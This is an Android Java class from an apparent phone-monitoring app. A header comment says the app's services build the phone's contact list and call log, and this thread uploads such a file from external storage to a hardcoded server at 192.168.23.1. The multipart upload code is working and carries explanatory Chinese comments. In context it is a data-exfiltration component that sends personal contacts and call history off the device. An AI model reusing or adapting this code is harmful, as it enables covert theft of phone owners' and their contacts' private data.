//两个Service的主体代码的功能是实现生成PhoneBook（CallLog），上传部分调用UploadUtils.java中的uploadFile方法来实现。


package com.system.mobilecontroller;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import android.os.Environment;

public class UploadThread implements Runnable {
	  /* 上传文件至Server的方法 */
	
	  String tarFile ; 
	  public void setTar(String tarFile)
	  {
		  this.tarFile = tarFile ; 
	  }
	  public void run()
	  {
		String srcPath = Environment.getExternalStorageDirectory().getPath()+"/Android/" + tarFile ;
		String actionUrl = "http://192.168.23.1:8080/upload_file_service/upload.jsp";
	    String uploadUrl = "http://192.168.23.1:8080/upload_file_service/UploadServlet";
	    String end = "\r\n";
	    String twoHyphens = "--";
	    String boundary = "******";
	    try
	    {
	      URL url = new URL(uploadUrl);
	      HttpURLConnection httpURLConnection = (HttpURLConnection) url
	          .openConnection();
	      
	      
	      httpURLConnection.setDoInput(true);
	      httpURLConnection.setDoOutput(true);
	      httpURLConnection.setUseCaches(false);
	      httpURLConnection.setRequestMethod("POST");
	      httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
	      httpURLConnection.setRequestProperty("Charset", "UTF-8");
	      httpURLConnection.setRequestProperty("Content-Type",
	          "multipart/form-data;boundary=" + boundary);
	      
//	      HTTP客户程序（例如浏览器），向服务器发送请求的时候必须指明请求类型（一般是GET或者POST）。
//	      如有必要，客户程序还可以选择发送其他的请求头。      
	      
//	      在网络编程过程中需要向服务器上传文件。Multipart/form-data是上传文件的一种方式。
//	      Multipart/form-data其实就是浏览器用表单上传文件的方式。最常见的情境是：在写邮件时，向邮件后添加附件，附件通常使用表单添加，
//	      也就是用multipart/form-data格式上传到服务器。
	      
//	      “boundary”是用来隔开表单中不同部分数据的。例子中的表单就有 2 部分数据，用“boundary”隔开。
//	      “boundary”一般由系统随机产生，但也可以简单的用“-------------”来代替。

	      DataOutputStream dos = new DataOutputStream(httpURLConnection
	          .getOutputStream());
	      dos.writeBytes(twoHyphens + boundary + end);
	      //--******
	      
//	      先用lastIndexOf("/")把光标定位到最后一个"/"前面（返回这个位置所在的索引位置，一个数字），并且+1移到/的后面一位；
//	      再用subString截取从/后一位到最后的所有字符。
	      dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""
	              + srcPath.substring(srcPath.lastIndexOf("/") + 1)
	              + "\"" + end);
	      //filename = \" " xx " \"
	      
	      dos.writeBytes(end);//在html协议中，用 “\r\n” 换行，而不是 “\n”。

	      FileInputStream fis = new FileInputStream(srcPath);//用FileInputStream读入
	      byte[] buffer = new byte[8192]; // 8k
	      int count = 0;
	      while ((count = fis.read(buffer)) != -1)
	      {
	        dos.write(buffer, 0, count); //用DataOutputStream写

	      }
	      fis.close();

	      dos.writeBytes(end);
	      dos.writeBytes(twoHyphens + boundary + twoHyphens + end);
	      dos.flush();
	      //（换行）--*******--（换行）

	      InputStream is = httpURLConnection.getInputStream();
	      InputStreamReader isr = new InputStreamReader(is, "utf-8");
	      BufferedReader br = new BufferedReader(isr);
	      String result = br.readLine();

//	      Toast.makeText(this, result, Toast.LENGTH_LONG).show();
	      dos.close();
	      is.close();

	    } catch (Exception e)
	    {
	      e.printStackTrace();
	    }

	  }

}
